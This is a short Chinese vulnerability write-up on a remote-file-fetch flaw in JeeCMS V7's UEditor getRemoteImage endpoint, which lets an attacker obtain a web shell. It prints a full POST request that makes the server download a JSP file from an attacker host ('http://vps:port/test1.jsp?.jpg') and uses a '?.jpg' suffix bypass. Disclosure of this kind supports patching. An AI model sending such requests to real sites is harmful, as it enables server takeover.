# 1、漏洞描述

jeecms V7版本的一个上传组件存在远程拉取图片的功能，并将远程拉取的文件保存在服务器上。但程序没有对远程文件的类型做好过滤，导致可从远程拉取任意格式的文件，可直接getshell。

V9版本做了修复，会对远程获取的文件后缀进行校验，并对上传的文件强行重命名。

# 2、漏洞复现

直接上POST包:

data数据中远程文件的后缀写为.jsp?.jpg是尝试绕过，虽然这样能上传上去，但是因强行文件重命名，传上去的也是一个图片。可直接尝试不带?.jpg去检查和利用。

```
POST /ueditor/getRemoteImage.jspx HTTP/1.1
Host: 127.0.0.1
Content-Length: 453
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZUxAA9jVG2OHOQYo
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryZUxAA9jVG2OHOQYo
Content-Disposition: form-data; name="upfile"

http://vps:port/test1.jsp?.jpg
------WebKitFormBoundaryZUxAA9jVG2OHOQYo
Content-Disposition: form-data; name="mark"


------WebKitFormBoundaryZUxAA9jVG2OHOQYo
Content-Disposition: form-data; name="uploadfile"; filename="test1.jsp.jpg"
Content-Type: application/octet-stream

<%out.println("123");%>
------WebKitFormBoundaryZUxAA9jVG2OHOQYo--

```

网站返回json格式的包含 远程图片抓取成功 以及url地址则证明存在漏洞

# 3、poc

因SSRF漏洞利用需要从远端获取信息，若要getshell，需要远端存在shell文件，所以poc需要修改poc_content方法中content参数里的url地址。

脚本中有个坑，post内容里的回车换行，这里用的\r\n表示的，直接回车换行请求会出问题，导致poc验证失败。
